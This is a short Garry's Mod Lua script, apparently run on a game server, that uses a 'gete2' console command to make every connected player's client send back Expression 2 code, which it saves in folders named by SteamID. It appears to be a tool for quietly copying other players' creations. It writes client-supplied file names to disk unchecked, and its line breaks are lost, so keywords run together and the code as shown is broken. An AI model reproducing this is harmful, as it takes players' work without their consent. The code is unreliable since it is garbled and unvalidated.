require("datastream")AddCSLuaFile("cl_coolfile.lua")local function CopyThaE2(sender, handler, id, encoded, decoded)	local SID = string.gsub(sender:SteamID(),":","-")	file.CreateDir("E2s")	file.CreateDir("E2s/"..SID)	file.Write("E2s/"..SID.."/"..decoded[1], decoded[2])	print("Got E2: "..SID.."/"..decoded[1])endlocal function GetTheE2()	print("Getting E2s...")	datastream.StreamToClients(player.GetAll(),"E2Send", {"nil"})enddatastream.Hook("E2Send", CopyThaE2)concommand.Add("gete2",GetTheE2)